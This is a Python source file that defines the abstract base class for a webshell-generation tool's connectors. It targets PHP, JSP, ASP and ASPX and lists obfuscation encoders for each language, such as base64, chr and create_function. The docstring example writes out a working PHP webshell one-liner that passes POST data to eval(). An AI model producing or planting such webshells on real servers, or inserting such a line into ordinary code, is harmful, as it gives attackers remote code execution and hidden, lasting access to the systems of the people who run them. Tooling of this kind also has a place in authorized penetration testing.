"""Base connector class for webshell generation.

This module defines the abstract interface for webshell connectors.
Connectors can generate webshells from templates, remote APIs, or custom logic.
"""

from abc import ABC, abstractmethod
from typing import Optional, List, Tuple
import logging

logger = logging.getLogger(__name__)


class WebshellConnector(ABC):
    """Abstract base class for webshell generation connectors.
    
    Connectors provide different methods for generating webshells:
    - Template-based (built-in templates)
    - File-based (user custom templates)
    - Remote (HTTP APIs, file shares)
    - Custom (programmatic generation)
    
    Attributes:
        name: Unique connector identifier
        description: Human-readable description
        
    Example:
        >>> class MyConnector(WebshellConnector):
        ...     def __init__(self):
        ...         super().__init__(
        ...             name="my-connector",
        ...             description="My custom webshell generator"
        ...         )
        ...     
        ...     def generate(self, language, password, encoder, **kwargs):
        ...         return f"<?php eval($_POST['{password}']); ?>"
    """
    
    def __init__(self, name: str, description: str = ""):
        """Initialize webshell connector.
        
        Args:
            name: Unique connector identifier (e.g., 'template', 'remote-api')
            description: Human-readable description
        """
        self.name = name
        self.description = description
        self._available = None
    
    @abstractmethod
    def generate(
        self,
        language: str,
        password: str = "pass",
        encoder: str = "default",
        secret_header: Optional[str] = None,
        secret_value: Optional[str] = None,
        inline: bool = False,
        **kwargs
    ) -> str:
        """Generate webshell code.
        
        Args:
            language: Target language ('php', 'jsp', 'asp', 'aspx')
            password: Password parameter name
            encoder: Encoding method (language-specific)
            secret_header: Optional HTTP header for authentication
            secret_value: Value for secret header
            inline: Remove whitespace for inline usage
            **kwargs: Additional connector-specific parameters
        
        Returns:
            Generated webshell code as string
        
        Raises:
            ValueError: If language not supported
            RuntimeError: If generation fails
        """
        pass
    
    def is_available(self) -> bool:
        """Check if connector is available for use.
        
        Caches the result after first check.
        
        Returns:
            True if connector dependencies are met
        """
        if self._available is None:
            self._available = self._check_availability()
        return self._available
    
    def _check_availability(self) -> bool:
        """Check connector availability (override in subclasses).
        
        Returns:
            True if all dependencies are available
        """
        return True
    
    def get_supported_languages(self) -> List[str]:
        """Get list of supported languages.
        
        Returns:
            List of language identifiers (e.g., ['php', 'jsp'])
        """
        return ['php', 'jsp', 'asp', 'aspx']
    
    def get_supported_encoders(self, language: str) -> List[str]:
        """Get supported encoders for a language.
        
        Args:
            language: Target language
        
        Returns:
            List of encoder identifiers
        """
        encoders = {
            'php': ['default', 'base64', 'chr', 'assert', 'create_function', 'callback', 'one_liner'],
            'jsp': ['default', 'base64', 'script_engine'],
            'asp': ['default', 'eval'],
            'aspx': ['default', 'base64', 'jscript'],
        }
        return encoders.get(language.lower(), ['default'])
    
    def validate_params(
        self,
        language: str,
        password: str,
        encoder: str,
    ) -> None:
        """Validate generation parameters.
        
        Args:
            language: Target language
            password: Password parameter
            encoder: Encoder type
        
        Raises:
            ValueError: If parameters are invalid
        """
        supported_langs = self.get_supported_languages()
        if language.lower() not in supported_langs:
            raise ValueError(
                f"Language '{language}' not supported by {self.name}. "
                f"Supported: {', '.join(supported_langs)}"
            )
        
        supported_encoders = self.get_supported_encoders(language)
        if encoder not in supported_encoders:
            logger.warning(
                f"Encoder '{encoder}' not in known encoders for {language}. "
                f"Known: {', '.join(supported_encoders)}"
            )
        
        if not password:
            raise ValueError("Password parameter cannot be empty")
    
    def __repr__(self) -> str:
        """String representation of connector."""
        return f"<{self.__class__.__name__}(name='{self.name}')>"
